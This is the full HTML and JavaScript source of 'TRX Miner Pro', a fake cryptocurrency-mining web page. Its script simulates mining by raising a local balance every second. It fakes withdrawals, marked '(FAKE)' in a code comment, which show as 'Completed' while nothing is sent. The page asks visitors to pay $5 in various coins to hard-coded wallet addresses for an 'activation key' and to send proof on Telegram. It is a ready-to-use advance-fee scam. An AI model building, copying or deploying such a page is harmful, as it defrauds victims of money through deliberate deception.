<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>TRX Miner Pro</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{box-sizing:border-box}
body{margin:0;background:#0b0f1a;color:#fff;font-family:system-ui,Segoe UI,Roboto}
header{background:#0f1530;padding:14px;text-align:center;font-size:20px;font-weight:700;color:#ff4d4d}
.container{padding:14px}
.card{background:#131a3a;padding:16px;border-radius:18px;margin-bottom:14px}
.balance{font-size:26px;color:#00ffa2;font-weight:700}
button{width:100%;padding:14px;border:none;border-radius:16px;font-weight:700;margin-top:10px}
.start{background:#00ff99;color:#000}
.stop{background:#ff5252;color:#fff}
.buy{background:#2979ff;color:#fff}
.tg{background:#0088cc;color:#fff}
.copy{background:#00ff99;color:#000}
button:disabled{opacity:.4}
input{width:100%;padding:13px;border-radius:16px;border:none;background:#0c1230;color:#fff;margin-top:10px}
.loader{width:42px;height:42px;border:5px solid #1c2555;border-top:5px solid #00ff99;border-radius:50%;animation:spin 1s linear infinite;display:none;margin:12px auto}
@keyframes spin{to{transform:rotate(360deg)}}
.key-ok{text-align:center;color:#00ff99;display:none;margin-top:10px}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(30px);padding:12px 18px;border-radius:20px;opacity:0;transition:.4s}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
.toast.success{background:#00c853}
.toast.error{background:#d50000}
.small{font-size:13px;opacity:.85}

/* Modal */
.modal{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center}
.modal-box{width:92%;max-width:420px;background:#131a3a;border-radius:20px;padding:18px}
.crypto-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.crypto-grid button{background:#1c2555;font-size:13px}
.history-item{background:#0c1230;border-radius:12px;padding:10px;margin-top:8px}
.badge{display:inline-block;padding:4px 8px;border-radius:10px;font-size:11px}
.pending{background:#ffb300;color:#000}
.done{background:#00c853}
</style>
</head>

<body>
<header>TRX Miner Pro</header>

<div class="container">

<img src="https://i.ibb.co/q3Y9BTbt/images.jpg" style="width:100%;border-radius:16px">

<!-- BALANCE + MINING -->
<div class="card">
  <div>Total Balance</div>
  <div class="balance" id="balance">0.000000 TRX</div>

  <button class="start" id="startBtn" disabled>‚õè Start Mining</button>
  <button class="stop" id="stopBtn" disabled>‚õî Stop Mining</button>
  <div class="loader" id="loader"></div>

  <input id="keyInput" placeholder="Enter Activation Key">
  <button class="buy" id="verifyBtn">üîë Verify Key</button>
  <div class="key-ok" id="keyOk">‚úî Key Verified</div>

  <button class="buy" onclick="openPayment()">üí≥ Buy Key ($5)</button>
</div>

<!-- WITHDRAW -->
<div class="card">
  <h3>Withdraw TRX</h3>
  <input id="wAmount" placeholder="Amount (Min 5 TRX)">
  <input id="wAddress" placeholder="Your TRX Address">
  <button class="start" onclick="withdraw()">Withdraw</button>
  <p class="small">Fee: 1 TRX | Minimum: 5 TRX</p>
</div>

<!-- HISTORY -->
<div class="card">
  <h3>Withdrawal History</h3>
  <div id="history" class="small">No withdrawals yet</div>
</div>

</div>

<!-- PAYMENT MODAL -->
<div class="modal" id="paymentModal">
  <div class="modal-box" id="paymentBox">
    <h3>Select Payment Method</h3>
    <div class="crypto-grid">
      <button onclick="pay('TRX','17.647 TRX','TCXs2tSYDFAHLpP8TYSECH9m2uS61Dp47t')">TRX</button>
      <button onclick="pay('USDT TRC20','5 USDT','TCXs2tSYDFAHLpP8TYSECH9m2uS61Dp47t')">USDT</button>
      <button onclick="pay('BTC','0.0000559 BTC','bc1q77qj0vujthsl4nx95pec89c2ylwcwxrmlq88am')">BTC</button>
      <button onclick="pay('ETH','0.001618 ETH','0x648Ae71DA87dbF1f492d84D604417f3DD0fBEEca')">ETH</button>
      <button onclick="pay('BNB','0.00559 BNB','0x648Ae71DA87dbF1f492d84D604417f3DD0fBEEca')">BNB</button>
      <button onclick="pay('DOGE','35.882 DOGE','DQ2jqbz551E1rZhkxf5JEgZkoqp5iPCtnQ')">DOGE</button>
      <button onclick="pay('SOL','0.0353 SOL','GN8g2KojCAL4vNe1MWFHrziLQAqijBh69Jsihj7JiWPX')">SOL</button>
      <button onclick="pay('LTC','0.0618 LTC','LRgBQCyXqYpnttF8TSeC95U1y4AUdo7ihb')">LTC</button>
      <button onclick="pay('TON','2.882 TON','UQCmtOEKKr8K_RmYxLrFNiZBix0w3SA6bH-xiAEBf7OmxYze')">TON</button>
    </div>
    <button class="stop" onclick="closePayment()">Close</button>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
/* CONFIG */
const VALID_KEY="HYMALQYAB";
const MIN_WITHDRAW=5;
const FEE=1;

/* STATE */
let balance=parseFloat(localStorage.getItem("balance"))||0;
let mining=null;
let history=JSON.parse(localStorage.getItem("history")||"[]");

/* EL */
const balanceEl=document.getElementById("balance");
const loader=document.getElementById("loader");
const toast=document.getElementById("toast");
const paymentBox=document.getElementById("paymentBox");
const paymentHome=paymentBox.innerHTML;

/* INIT */
updateBalance();
renderHistory();

/* UI HELPERS */
function showToast(msg,type){
 toast.innerText=msg;
 toast.className="toast show "+type;
 setTimeout(()=>toast.className="toast",2500);
}
function updateBalance(){
 balanceEl.innerText=balance.toFixed(6)+" TRX";
 localStorage.setItem("balance",balance);
}

/* KEY */
document.getElementById("verifyBtn").onclick=()=>{
 const key=document.getElementById("keyInput").value.trim();
 if(key===VALID_KEY){
  document.getElementById("startBtn").disabled=false;
  document.getElementById("stopBtn").disabled=false;
  document.getElementById("keyOk").style.display="block";
  showToast("Key verified","success");
 }else{
  showToast("Invalid key","error");
 }
};

/* MINING */
document.getElementById("startBtn").onclick=()=>{
 if(mining) return;
 loader.style.display="block";
 mining=setInterval(()=>{
  balance+=0.0003;
  updateBalance();
 },1000);
};
document.getElementById("stopBtn").onclick=()=>{
 clearInterval(mining);
 mining=null;
 loader.style.display="none";
};

/* WITHDRAW (FAKE) */
function withdraw(){
 const amt=parseFloat(document.getElementById("wAmount").value);
 const addr=document.getElementById("wAddress").value.trim();
 if(!amt||amt<MIN_WITHDRAW) return showToast("Minimum 5 TRX","error");
 if(!addr) return showToast("Enter address","error");
 if(amt+0 > balance) return showToast("Insufficient balance","error");

 balance -= amt;
 updateBalance();

 const item={amount:amt,address:addr,status:"Pending",time:Date.now()};
 history.unshift(item);
 saveHistory();
 renderHistory();
 showToast("Withdrawal submitted","success");

 setTimeout(()=>{
  item.status="Completed";
  saveHistory();
  renderHistory();
 },3000);
}

function saveHistory(){
 localStorage.setItem("history",JSON.stringify(history));
}
function renderHistory(){
 const h=document.getElementById("history");
 if(history.length===0){h.innerText="No withdrawals yet";return;}
 h.innerHTML="";
 history.forEach(i=>{
  h.innerHTML+=`
   <div class="history-item">
    <div><b>${i.amount} TRX</b></div>
    <div class="small">${i.address}</div>
    <span class="badge ${i.status==='Pending'?'pending':'done'}">${i.status}</span>
   </div>`;
 });
}

/* PAYMENT MODAL */
function openPayment(){
 document.getElementById("paymentModal").style.display="flex";
 paymentBox.innerHTML=paymentHome;
}
function closePayment(){
 document.getElementById("paymentModal").style.display="none";
}
function goBack(){
 paymentBox.innerHTML=paymentHome;
}
function pay(name,amount,address){
 paymentBox.innerHTML=`
  <h3>${name} Payment</h3>
  <p class="small">Send exactly:</p>
  <p><b>${amount}</b></p>
  <p class="small">Wallet Address:</p>
  <input value="${address}" readonly>
  <button class="copy" onclick="navigator.clipboard.writeText('${address}');showToast('Address copied','success')">üìã Copy Address</button>
  <a href="https://t.me/CryptoMinerApp10" target="_blank">
    <button class="tg">üì© Send Screenshot on Telegram</button>
  </a>
  <button class="buy" onclick="goBack()">‚¨Ö Back</button>
 `;
}
</script>
</body>
</html>
